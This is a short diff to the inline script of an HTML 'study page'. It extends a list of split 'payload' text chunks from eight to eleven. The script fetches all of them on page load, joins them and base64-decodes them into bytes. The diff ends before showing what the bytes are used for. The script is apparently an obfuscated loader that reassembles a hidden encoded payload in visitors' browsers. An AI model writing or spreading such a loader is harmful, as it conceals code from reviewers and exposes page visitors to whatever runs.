@@ -12,7 +12,7 @@
 <noscript>This study page requires JavaScript.</noscript>
 <script>
 (async()=>{
-const names=['payload-1.txt','payload-2.txt','payload-3.txt','payload-4.txt','payload-5.txt','payload-6.txt','payload-7.txt','payload-8.txt'];
+const names=["payload-1.txt?v=f7d22cc65787","payload-2.txt?v=f7d22cc65787","payload-3.txt?v=f7d22cc65787","payload-4.txt?v=f7d22cc65787","payload-5.txt?v=f7d22cc65787","payload-6.txt?v=f7d22cc65787","payload-7.txt?v=f7d22cc65787","payload-8.txt?v=f7d22cc65787","payload-9.txt?v=f7d22cc65787","payload-10.txt?v=f7d22cc65787","payload-11.txt?v=f7d22cc65787"];
 const parts=await Promise.all(names.map(async name=>{const response=await fetch(name,{cache:'force-cache'});if(!response.ok)throw new Error(`Missing deployment asset: ${name}`);return response.text()}));
 const encoded=parts.join('');
 const bytes=Uint8Array.from(atob(encoded),character=>character.charCodeAt(0));
